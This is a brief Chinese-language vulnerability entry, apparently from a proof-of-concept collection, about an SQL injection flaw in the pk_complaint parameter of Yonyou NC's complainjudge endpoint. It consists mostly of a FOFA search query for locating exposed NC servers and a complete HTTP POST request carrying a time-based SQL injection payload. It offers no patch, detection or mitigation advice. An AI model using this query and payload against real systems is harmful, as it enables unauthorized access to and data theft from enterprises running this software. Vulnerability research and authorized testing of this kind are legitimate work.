# 用友NC系统complainjudge接口SQL注入漏洞(XVE-2024-19043)

用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。 用友NC系统/ebvp/advorappcoll/complainbilldetail和complainjudge接口的pk_complaint参数存在SQL注入，攻击者能够通过该漏洞获取泄露服务器信息。

## fofa

```yaml
app="用友-UFIDA-NC
```

## poc

```java
POST /ebvp/advorappcoll/complainjudge HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:5%27--
```

